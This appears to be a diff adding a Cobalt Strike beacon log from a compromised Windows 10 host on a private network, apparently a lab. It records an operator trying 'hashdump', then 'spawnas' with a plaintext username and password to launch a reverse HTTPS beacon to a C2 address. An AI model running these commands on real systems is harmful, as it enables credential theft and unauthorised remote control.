@@ -1,0 +1,17 @@
+01/07 08:38:41 UTC [metadata] 192.168.43.216 <- 192.168.43.216; computer: DESKTOP-B0D0J2Q; user: ANH KHOA; process: mspaint.exe; pid: 4252; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+01/07 08:42:03 UTC [input] <neo> sleep 10
+01/07 08:42:03 UTC [task] <T1029> Tasked beacon to sleep for 10s
+01/07 08:42:09 UTC [input] <neo> desktop
+01/07 08:42:20 UTC [input] <neo> hashdump
+01/07 08:42:20 UTC [error] this command requires administrator privileges
+01/07 08:42:36 UTC [checkin] host called home, sent: 32 bytes
+01/07 09:10:41 UTC [input] <neo> spawnas .\Huy 12345 my
+01/07 09:10:41 UTC [task] <T1078, T1093, T1106> Tasked beacon to spawn windows/beacon_https/reverse_https (192.168.43.162:443) as .\Huy
+01/07 09:10:49 UTC [input] <neo> exit
+01/07 09:10:49 UTC [task] <> Tasked beacon to exit
+01/07 09:11:31 UTC [metadata] 192.168.43.216 <- 192.168.43.216; computer: DESKTOP-B0D0J2Q; user: ANH KHOA; process: mspaint.exe; pid: 4252; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+01/07 09:11:28 UTC [checkin] host called home, sent: 277029 bytes
+01/07 09:11:29 UTC [error] could not run C:\WINDOWS\system32\rundll32.exe as .\Huy: 1326
+01/07 09:11:29 UTC [output]
+beacon exit.
+
